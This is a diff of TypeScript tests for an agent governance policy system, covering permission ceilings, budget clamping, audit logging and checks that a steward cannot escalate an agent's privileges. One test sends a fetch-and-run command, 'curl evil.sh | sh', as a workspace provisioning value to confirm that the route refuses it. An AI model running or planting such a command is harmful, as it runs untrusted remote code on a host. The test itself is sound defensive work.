@@ -16,6 +16,7 @@ import {
   AGENT_POLICY_UNLIMITED_BUDGET_CENTS,
   AGENT_POLICY_WILDCARD,
   DEFAULT_AGENT_GOVERNANCE_POLICY,
+  agentGovernancePolicySchema,
   assertWithinCeiling,
   computeEffectiveAgentPolicy,
   type AgentGovernancePolicy,
@@ -88,9 +89,9 @@ describe("agent governance policy intersection", () => {
     }
 
     expect(violations).toEqual([
-      { field: "permissions", code: "PERMISSION_NOT_ALLOWED", requested: ["secrets:read"], allowed: CEILING.permissions },
-      { field: "destructiveActions", code: "DESTRUCTIVE_ACTIONS_EXCEED_CEILING", requested: "allowed", allowed: "approval_required" },
-      { field: "minimumApproval", code: "MINIMUM_APPROVAL_BELOW_CEILING", requested: "none", allowed: "steward" },
+      { field: "permissions", code: "PERMISSION_NOT_ALLOWED", requested: ["secrets:read"], allowed: CEILING.permissions, direction: "max" },
+      { field: "destructiveActions", code: "DESTRUCTIVE_ACTIONS_EXCEED_CEILING", requested: "allowed", allowed: "approval_required", direction: "max" },
+      { field: "minimumApproval", code: "MINIMUM_APPROVAL_BELOW_CEILING", requested: "none", allowed: "steward", direction: "min" },
     ]);
   });
 
@@ -107,7 +108,7 @@ describe("agent governance policy intersection", () => {
       violations = (error as { violations: Array<{ field: string; code: string }> }).violations;
     }
     expect(violations).toEqual([
-      { field: "monthlyBudgetCents", code: "BUDGET_EXCEEDS_CEILING", requested: 20_000, allowed: 10_000 },
+      { field: "monthlyBudgetCents", code: "BUDGET_EXCEEDS_CEILING", requested: 20_000, allowed: 10_000, direction: "max" },
     ]);
   });
 
@@ -123,8 +124,8 @@ describe("agent governance policy intersection", () => {
       violations = (error as { violations: Array<{ field: string; code: string }> }).violations;
     }
     expect(violations).toEqual([
-      { field: "dataScopes", code: "DATA_SCOPE_NOT_ALLOWED", requested: ["project:secret"], allowed: CEILING.dataScopes },
-      { field: "providers", code: "PROVIDER_NOT_ALLOWED", requested: ["slack"], allowed: CEILING.providers },
+      { field: "dataScopes", code: "DATA_SCOPE_NOT_ALLOWED", requested: ["project:secret"], allowed: CEILING.dataScopes, direction: "max" },
+      { field: "providers", code: "PROVIDER_NOT_ALLOWED", requested: ["slack"], allowed: CEILING.providers, direction: "max" },
     ]);
   });
 
@@ -162,12 +163,108 @@ describe("agent governance policy intersection", () => {
       .toEqual(["issues:read", "issues:write"]);
   });
 
-  it("keeps the default policy unrestricted so profile activation changes nothing by itself", () => {
-    expect(DEFAULT_AGENT_GOVERNANCE_POLICY.permissions).toEqual([AGENT_POLICY_WILDCARD]);
-    expect(DEFAULT_AGENT_GOVERNANCE_POLICY.monthlyBudgetCents).toBe(AGENT_POLICY_UNLIMITED_BUDGET_CENTS);
+  it("keeps the default policy unrestricted on every enumerable dimension", () => {
+    // Asserts the WHOLE default, not just the two permissive fields, so the
+    // documented intent and the values cannot drift apart silently.
+    expect(DEFAULT_AGENT_GOVERNANCE_POLICY).toEqual({
+      permissions: [AGENT_POLICY_WILDCARD],
+      monthlyBudgetCents: AGENT_POLICY_UNLIMITED_BUDGET_CENTS,
+      destructiveActions: "approval_required",
+      dataScopes: [AGENT_POLICY_WILDCARD],
+      providers: [AGENT_POLICY_WILDCARD],
+      minimumApproval: "steward",
+    });
     expect(() => assertWithinCeiling(DEFAULT_AGENT_GOVERNANCE_POLICY, DEFAULT_AGENT_GOVERNANCE_POLICY)).not.toThrow();
     expect(computeEffectiveAgentPolicy(DEFAULT_AGENT_GOVERNANCE_POLICY, DEFAULT_AGENT_GOVERNANCE_POLICY))
       .toEqual(DEFAULT_AGENT_GOVERNANCE_POLICY);
+  });
+
+  it("takes the stricter mode on both ordered dimensions, in both directions", () => {
+    const permissive: AgentGovernancePolicy = {
+      ...CEILING,
+      destructiveActions: "allowed",
+      minimumApproval: "none",
+    };
+    // Ceiling permissive, request strict -> request wins (it is stricter).
+    expect(computeEffectiveAgentPolicy(permissive, { ...REQUESTED_WITHIN, destructiveActions: "blocked" }).destructiveActions)
+      .toBe("blocked");
+    expect(computeEffectiveAgentPolicy(permissive, { ...REQUESTED_WITHIN, minimumApproval: "steward" }).minimumApproval)
+      .toBe("steward");
+    // A request stricter than a permissive ceiling is never a violation.
+    expect(() => assertWithinCeiling(permissive, { ...REQUESTED_WITHIN, minimumApproval: "steward" })).not.toThrow();
+    expect(() => assertWithinCeiling(permissive, { ...REQUESTED_WITHIN, destructiveActions: "blocked" })).not.toThrow();
+  });
+
+  it("treats an empty ceiling list as deny-all consistently in compute and assert", () => {
+    const denyAll: AgentGovernancePolicy = { ...CEILING, permissions: [] };
+    expect(computeEffectiveAgentPolicy(denyAll, REQUESTED_WITHIN).permissions).toEqual([]);
+    expect(() => assertWithinCeiling(denyAll, REQUESTED_WITHIN)).toThrow();
+    // A wildcard request against a deny-all ceiling asks for "whatever is
+    // allowed", which is nothing — allowed, but it grants nothing.
+    expect(computeEffectiveAgentPolicy(denyAll, { ...REQUESTED_WITHIN, permissions: [AGENT_POLICY_WILDCARD] }).permissions)
+      .toEqual([]);
+    expect(() => assertWithinCeiling(denyAll, { ...REQUESTED_WITHIN, permissions: [AGENT_POLICY_WILDCARD] })).not.toThrow();
+  });
+
+  it("never yields an effective policy broader than the ceiling", () => {
+    const ceilings: AgentGovernancePolicy[] = [
+      CEILING,
+      { ...CEILING, permissions: [] },
+      { ...CEILING, permissions: [AGENT_POLICY_WILDCARD] },
+      DEFAULT_AGENT_GOVERNANCE_POLICY,
+    ];
+    const requests: AgentGovernancePolicy[] = [
+      REQUESTED_WITHIN,
+      REQUESTED_TOO_BROAD,
+      { ...REQUESTED_WITHIN, permissions: [AGENT_POLICY_WILDCARD] },
+      { ...REQUESTED_WITHIN, permissions: [] },
+      DEFAULT_AGENT_GOVERNANCE_POLICY,
+    ];
+
+    for (const ceiling of ceilings) {
+      for (const requestedPolicy of requests) {
+        const effective = computeEffectiveAgentPolicy(ceiling, requestedPolicy);
+        // The clamped result must itself always be acceptable to the ceiling.
+        expect(
+          () => assertWithinCeiling(ceiling, effective),
+          `effective exceeded ceiling for ${JSON.stringify({ ceiling, requestedPolicy })}`,
+        ).not.toThrow();
+        expect(effective.monthlyBudgetCents).toBeLessThanOrEqual(ceiling.monthlyBudgetCents);
+        if (!ceiling.permissions.includes(AGENT_POLICY_WILDCARD)) {
+          for (const permission of effective.permissions) {
+            expect(ceiling.permissions).toContain(permission);
+          }
+        }
+      }
+    }
+  });
+
+  it("rejects a wildcard mixed with concrete entries at the validator", () => {
+    // Normalization collapses ["a","*"] to ["*"], which would silently widen a
+    // steward request to the entire ceiling, so the edge must refuse it.
+    const mixed = agentGovernancePolicySchema.safeParse({
+      ...REQUESTED_WITHIN,
+      permissions: ["issues:read", AGENT_POLICY_WILDCARD],
+    });
+    expect(mixed.success).toBe(false);
+
+    expect(agentGovernancePolicySchema.safeParse(REQUESTED_WITHIN).success).toBe(true);
+    expect(
+      agentGovernancePolicySchema.safeParse({ ...REQUESTED_WITHIN, permissions: [AGENT_POLICY_WILDCARD] }).success,
+    ).toBe(true);
+  });
+
+  it("marks minimumApproval as a floor and the other dimensions as maxima", () => {
+    let violations: Array<{ field: string; direction: string }> = [];
+    try {
+      assertWithinCeiling(CEILING, REQUESTED_TOO_BROAD);
+    } catch (error) {
+      violations = (error as { violations: Array<{ field: string; direction: string }> }).violations;
+    }
+    const byField = Object.fromEntries(violations.map((v) => [v.field, v.direction]));
+    expect(byField.permissions).toBe("max");
+    expect(byField.destructiveActions).toBe("max");
+    expect(byField.minimumApproval).toBe("min");
   });
 });
 
@@ -672,6 +769,164 @@ describeEmbeddedPostgres("agent governance service and routes", () => {
       );
       expect(accepted.status, JSON.stringify(accepted.body)).toBe(200);
       expect(accepted.body.budgetMonthlyCents).toBe(9_000);
+    });
+
+    // These are the escalation paths: a steward is an ordinary operator, so any
+    // field that can be turned into broader authority must stay admin-only.
+    it("refuses to let a steward promote their agent to a privileged role", async () => {
+      const { company, steward, agent } = await seed();
+      const app = await createAgentApp(makeBoardActor(company.id, steward.principalId, "operator"));
+
+      const res = await requestApp(app, (baseUrl) =>
+        request(baseUrl).patch(`/api/agents/${agent.id}`).send({ role: "ceo" }),
+      );
+
+      expect(res.status).toBe(403);
+      const unchanged = await db
+        .select()
+        .from(agents)
+        .where(eq(agents.id, agent.id))
+        .then((rows) => rows[0]!);
+      expect(unchanged.role).toBe("engineer");
+    });
+
+    it("refuses steward writes to host-executed workspace commands and other ungoverned fields", async () => {
+      const { company, steward, agent } = await seed();
+      const app = await createAgentApp(makeBoardActor(company.id, steward.principalId, "operator"));
+
+      for (const body of [
+        { adapterConfig: { workspaceStrategy: { provisionCommand: "curl evil.sh | sh" } } },
+        { adapterType: "http" },
+        { runtimeConfig: { anything: true } },
+        { spentMonthlyCents: 0 },
+        { status: "active" },
+        { reportsTo: null },
+      ]) {
+        const res = await requestApp(app, (baseUrl) =>
+          request(baseUrl).patch(`/api/agents/${agent.id}`).send(body),
+        );
+        expect(res.status, `expected 403 for ${JSON.stringify(body)}`).toBe(403);
+      }
+    });
+
+    it("refuses steward-initiated configuration rollback", async () => {
+      const { company, steward, agent } = await seed();
+      const app = await createAgentApp(makeBoardActor(company.id, steward.principalId, "operator"));
+
+      const res = await requestApp(app, (baseUrl) =>
+        request(baseUrl).post(`/api/agents/${agent.id}/config-revisions/${randomUUID()}/rollback`).send({}),
+      );
+
+      expect(res.status).toBe(403);
+    });
+
+    it("validates the permissions that will actually be written, not just the request body", async () => {
+      const { company, owner, steward, agent } = await seed();
+      const svc = agentGovernanceService(db);
+      // Ceiling deliberately withholds tasks:assign.
+      await svc.updateOwnerCeiling(company.id, agent.id, {
+        policy: { ...CEILING, permissions: ["agents:create"] },
+        revision: (await svc.getForAgent(company.id, agent.id)).revision,
+        actorUserId: owner.principalId,
+        channel: "web",
+      });
+      const app = await createAgentApp(makeBoardActor(company.id, steward.principalId, "operator"));
+
+      // canAssignTasks is false, but the route derives it as true from
+      // canCreateAgents — the ceiling must see the derived value.
+      const res = await requestApp(app, (baseUrl) =>
+        request(baseUrl)
+          .patch(`/api/agents/${agent.id}/permissions`)
+          .send({ canCreateAgents: true, canAssignTasks: false }),
+      );
+
+      expect(res.status).toBe(422);
+      expect(res.body.details.violations.map((v: { code: string }) => v.code)).toContain(
+        "PERMISSION_NOT_ALLOWED",
+      );
+    });
+
+    it("audits a ceiling rejection raised from the agent configuration routes", async () => {
+      const { company, owner, steward, agent } = await seed();
+      const svc = agentGovernanceService(db);
+      await svc.updateOwnerCeiling(company.id, agent.id, {
+        policy: CEILING,
+        revision: (await svc.getForAgent(company.id, agent.id)).revision,
+        actorUserId: owner.principalId,
+        channel: "web",
+      });
+      const app = await createAgentApp(makeBoardActor(company.id, steward.principalId, "operator"));
+
+      await requestApp(app, (baseUrl) =>
+        request(baseUrl).patch(`/api/agents/${agent.id}`).send({ budgetMonthlyCents: 90_000 }),
+      );
+
+      const rejected = await db
+        .select()
+        .from(activityLog)
+        .where(eq(activityLog.action, "agent.governance_change_rejected"))
+        .then((rows) => rows[0]!);
+      expect(rejected).toBeDefined();
+      expect(rejected.actorId).toBe(steward.principalId);
+      expect(rejected.details).toMatchObject({ code: "AGENT_POLICY_CEILING_EXCEEDED" });
+    });
+
+    it("clamps an already-configured agent when the owner lowers the ceiling beneath it", async () => {
+      const { company, owner, agent } = await seed();
+      const svc = agentGovernanceService(db);
+      await db
+        .update(agents)
+        .set({ budgetMonthlyCents: 90_000 })
+        .where(eq(agents.id, agent.id));
+
+      await svc.updateOwnerCeiling(company.id, agent.id, {
+        policy: CEILING, // monthlyBudgetCents: 10_000
+        revision: (await svc.getForAgent(company.id, agent.id)).revision,
+        actorUserId: owner.principalId,
+        channel: "web",
+      });
+
+      const clamped = await db
+        .select()
+        .from(agents)
+        .where(eq(agents.id, agent.id))
+        .then((rows) => rows[0]!);
+      expect(clamped.budgetMonthlyCents).toBe(10_000);
+
+      const event = await db
+        .select()
+        .from(activityLog)
+        .where(eq(activityLog.action, "agent.governance_configuration_clamped"))
+        .then((rows) => rows[0]!);
+      expect(event.details).toMatchObject({
+        reason: "ceiling_lowered",
+        field: "budgetMonthlyCents",
+        previous: 90_000,
+        clampedTo: 10_000,
+      });
+    });
+
+    it("still allows deleting an agent that has a materialized governance row", async () => {
+      const { company, owner, agent } = await seed();
+      const svc = agentGovernanceService(db);
+      await svc.updateOwnerCeiling(company.id, agent.id, {
+        policy: CEILING,
+        revision: (await svc.getForAgent(company.id, agent.id)).revision,
+        actorUserId: owner.principalId,
+        channel: "web",
+      });
+      const app = await createAgentApp(makeBoardActor(company.id, owner.principalId, "owner"));
+
+      const res = await requestApp(app, (baseUrl) =>
+        request(baseUrl).delete(`/api/agents/${agent.id}`),
+      );
+
+      expect(res.status, JSON.stringify(res.body)).toBe(200);
+      const remaining = await db
+        .select()
+        .from(agents)
+        .where(eq(agents.id, agent.id));
+      expect(remaining).toHaveLength(0);
     });
 
     it("leaves default-profile authority unchanged", async () => {
